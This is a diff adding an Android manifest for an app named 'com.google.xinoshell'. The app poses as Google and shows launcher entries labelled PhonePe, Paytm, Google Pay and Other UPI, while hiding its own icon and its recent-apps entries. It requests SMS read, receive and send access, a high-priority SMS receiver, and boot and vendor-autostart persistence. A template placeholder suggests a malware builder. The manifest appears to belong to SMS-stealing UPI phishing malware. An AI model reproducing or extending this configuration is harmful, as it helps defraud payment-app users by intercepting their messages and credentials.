@@ -1,0 +1,196 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="36" android:compileSdkVersionCodename="16" package="com.google.xinoshell" platformBuildVersionCode="36" platformBuildVersionName="16">
+    <permission android:name="android.permission.INTERNET"/>
+    <uses-feature android:name="android.hardware.telephony" android:required="false"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.CALL_PHONE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.BATTERY_STATS"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CONNECTED_DEVICE"/>
+    <uses-permission android:name="android.permission.REQUEST_COMPANION_USE_DATA_IN_BACKGROUND"/>
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.BROADCAST_SMS"/>
+    <uses-permission android:name="oppo.permission.OPPO_COMPONENT_SAFE"/>
+    <uses-permission android:name="com.huawei.permission.external_app_settings.USE_COMPONENT"/>
+    <uses-permission android:name="com.meizu.flyme.permission.C2D_MESSAGE"/>
+    <uses-permission android:name="com.xiaomi.permission.MIPUSH_RECEIVE"/>
+    <uses-permission android:name="com.coloros.safecenter.permission.startupmonitor"/>
+    <uses-permission android:name="com.miui.permcenter.autostart"/>
+    <uses-permission android:name="com.vivo.permissionmanager.aidl"/>
+    <uses-permission android:name="com.letv.android.letvsafe.permission.AutoStart"/>
+    <uses-permission android:name="com.asus.permission.auto_startup"/>
+    <queries>
+        <intent>
+            <action android:name="android.intent.action.BOOT_COMPLETED"/>
+        </intent>
+        <intent>
+            <action android:name="android.intent.action.MY_PACKAGE_REPLACED"/>
+        </intent>
+        <intent>
+            <action android:name="android.intent.action.USER_PRESENT"/>
+        </intent>
+        <intent>
+            <action android:name="android.intent.action.SCREEN_ON"/>
+        </intent>
+        <intent>
+            <action android:name="android.intent.action.SCREEN_OFF"/>
+        </intent>
+        <intent>
+            <action android:name="android.intent.action.TIME_TICK"/>
+        </intent>
+        <package android:name="com.miui.securitycenter"/>
+        <package android:name="com.miui.powerkeeper"/>
+        <intent>
+            <action android:name="miui.intent.action.OP_AUTO_START"/>
+        </intent>
+        <package android:name="com.huawei.systemmanager"/>
+        <package android:name="com.huawei.powergenie"/>
+        <intent>
+            <action android:name="huawei.intent.action.HSM_BOOT_COMPLETED"/>
+        </intent>
+        <package android:name="com.oppo.safe"/>
+        <package android:name="com.coloros.oppoguardelf"/>
+        <intent>
+            <action android:name="oppo.intent.action.OPPO_COMPONENT_SAFE"/>
+        </intent>
+        <package android:name="com.vivo.abe"/>
+        <package android:name="com.vivo.permissionmanager"/>
+        <intent>
+            <action android:name="com.vivo.safe.permissionmanager.action.AUTO_START"/>
+        </intent>
+        <package android:name="com.samsung.android.lool"/>
+        <package android:name="com.samsung.android.sm"/>
+        <intent>
+            <action android:name="samsung.intent.action.STARTUP_MANAGER"/>
+        </intent>
+        <package android:name="com.oneplus.security"/>
+        <intent>
+            <action android:name="oneplus.intent.action.OPPO_COMPONENT_SAFE"/>
+        </intent>
+        <package android:name="com.letv.android.letvsafe"/>
+        <package android:name="com.asus.mobilemanager"/>
+        <package android:name="com.meizu.safe"/>
+        <package android:name="com.lenovo.security"/>
+        <package android:name="com.gionee.softmanager"/>
+        <intent>
+            <action android:name="android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+        </intent>
+        <intent>
+            <action android:name="android.settings.IGNORE_BATTERY_OPTIMIZATION_SETTINGS"/>
+        </intent>
+    </queries>
+    <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE"/>
+    <application android:allowBackup="true" android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:dataExtractionRules="@xml/data_extraction_rules" android:debuggable="true" android:extractNativeLibs="false" android:fullBackupContent="@xml/backup_rules" android:hardwareAccelerated="true" android:icon="@drawable/empty" android:label="@string/app" android:largeHeap="true" android:supportsRtl="false" android:theme="@style/AppTheme" android:usesCleartextTraffic="true">
+        <activity android:enabled="true" android:exported="true" android:name="com.google.xinoshell.MainActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.{CATAGORY_TYPE}"/>
+            </intent-filter>
+        </activity>
+        <activity android:excludeFromRecents="true" android:exported="true" android:icon="@drawable/phonepe_upi" android:label="Phone Pe" android:launchMode="singleInstance" android:name="com.google.xinoshell.activities.PhonepeActivity"/>
+        <activity-alias android:enabled="true" android:exported="true" android:name="com.google.xinoshell.PhonePeLauncher" android:targetActivity="com.google.xinoshell.activities.PhonepeActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <action android:name="android.intent.catagory.INFO"/>
+            </intent-filter>
+        </activity-alias>
+        <activity android:excludeFromRecents="true" android:exported="true" android:icon="@drawable/paytm_upi" android:label="Paytm" android:launchMode="singleInstance" android:name="com.google.xinoshell.activities.PaytmActivity"/>
+        <activity-alias android:enabled="true" android:exported="true" android:icon="@drawable/paytm_upi" android:label="Paytm" android:name="com.google.xinoshell.PaytmLauncher" android:targetActivity="com.google.xinoshell.activities.PaytmActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <action android:name="android.intent.catagory.INFO"/>
+            </intent-filter>
+        </activity-alias>
+        <activity android:excludeFromRecents="true" android:exported="true" android:icon="@drawable/google_pay" android:label="Google Pay" android:launchMode="singleInstance" android:name="com.google.xinoshell.activities.GpayActivity"/>
+        <activity-alias android:enabled="true" android:exported="true" android:icon="@drawable/google_pay" android:label="Google Pay" android:name="com.google.xinoshell.GPayLauncher" android:targetActivity="com.google.xinoshell.activities.GpayActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <action android:name="android.intent.catagory.INFO"/>
+            </intent-filter>
+        </activity-alias>
+        <activity android:excludeFromRecents="true" android:exported="true" android:icon="@drawable/other_upi" android:label="Other UPI" android:launchMode="singleInstance" android:name="com.google.xinoshell.activities.OtherActivity"/>
+        <activity-alias android:enabled="true" android:exported="true" android:icon="@drawable/other_upi" android:label="Other UPI" android:name="com.google.xinoshell.OtherUpiLauncher" android:targetActivity="com.google.xinoshell.activities.OtherActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <action android:name="android.intent.catagory.INFO"/>
+            </intent-filter>
+        </activity-alias>
+        <service android:enabled="true" android:exported="true" android:foregroundServiceType="connectedDevice" android:name="com.google.xinoshell.services.BgService" android:stopWithTask="false"/>
+        <service android:directBootAware="true" android:exported="false" android:name="com.google.xinoshell.services.PersistentFCMService">
+            <intent-filter>
+                <action android:name="com.google.firebase.MESSAGING_EVENT"/>
+            </intent-filter>
+        </service>
+        <receiver android:enabled="true" android:exported="true" android:name="com.google.xinoshell.receivers.SmsReceiver" android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter android:priority="500">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+                <action android:name="android.provider.Telephony.SMS_SENT"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:directBootAware="true" android:enabled="true" android:exported="true" android:name="com.google.xinoshell.receivers.BootReceiver">
+            <intent-filter android:priority="200">
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED"/>
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON"/>
+                <action android:name="android.intent.action.REBOOT"/>
+                <action android:name="android.intent.action.ACTION_SHUTDOWN"/>
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:enabled="true" android:exported="false" android:name="com.google.xinoshell.receivers.NetworkChangeReceiver">
+            <intent-filter>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+            </intent-filter>
+        </receiver>
+        <meta-data android:name="firebase_messaging_auto_init_enabled" android:value="false"/>
+        <meta-data android:name="firebase_analytics_collection_enabled" android:value="false"/>
+        <receiver android:directBootAware="true" android:exported="true" android:name="com.google.firebase.messaging.directboot.FirebaseMessagingDirectBootReceiver" android:permission="com.google.android.c2dm.permission.SEND">
+            <intent-filter>
+                <action android:name="com.google.firebase.messaging.RECEIVE_DIRECT_BOOT"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:exported="true" android:name="com.google.firebase.iid.FirebaseInstanceIdReceiver" android:permission="com.google.android.c2dm.permission.SEND">
+            <intent-filter>
+                <action android:name="com.google.android.c2dm.intent.RECEIVE"/>
+            </intent-filter>
+            <meta-data android:name="com.google.android.gms.cloudmessaging.FINISHED_AFTER_HANDLED" android:value="true"/>
+        </receiver>
+        <service android:directBootAware="true" android:exported="false" android:name="com.google.firebase.messaging.FirebaseMessagingService">
+            <intent-filter android:priority="-500">
+                <action android:name="com.google.firebase.MESSAGING_EVENT"/>
+            </intent-filter>
+        </service>
+        <service android:directBootAware="true" android:exported="false" android:name="com.google.firebase.components.ComponentDiscoveryService">
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.messaging.FirebaseMessagingKtxRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.messaging.FirebaseMessagingRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.installations.FirebaseInstallationsKtxRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.installations.FirebaseInstallationsRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.FirebaseCommonKtxRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+            <meta-data android:name="com.google.firebase.components:com.google.firebase.datatransport.TransportRegistrar" android:value="com.google.firebase.components.ComponentRegistrar"/>
+        </service>
+        <provider android:authorities="com.google.xinoshell.firebaseinitprovider" android:directBootAware="true" android:exported="false" android:initOrder="100" android:name="com.google.firebase.provider.FirebaseInitProvider"/>
+        <service android:exported="false" android:name="com.google.android.datatransport.runtime.backends.TransportBackendDiscovery">
+            <meta-data android:name="backend:com.google.android.datatransport.cct.CctBackendFactory" android:value="cct"/>
+        </service>
+        <service android:exported="false" android:name="com.google.android.datatransport.runtime.scheduling.jobscheduling.JobInfoSchedulerService" android:permission="android.permission.BIND_JOB_SERVICE"/>
+        <receiver android:exported="false" android:name="com.google.android.datatransport.runtime.scheduling.jobscheduling.AlarmManagerSchedulerBroadcastReceiver"/>
+        <activity android:exported="false" android:name="com.google.android.gms.common.api.GoogleApiActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <meta-data android:name="com.google.android.gms.version" android:value="@integer/google_play_services_version"/>
+    </application>
+</manifest>
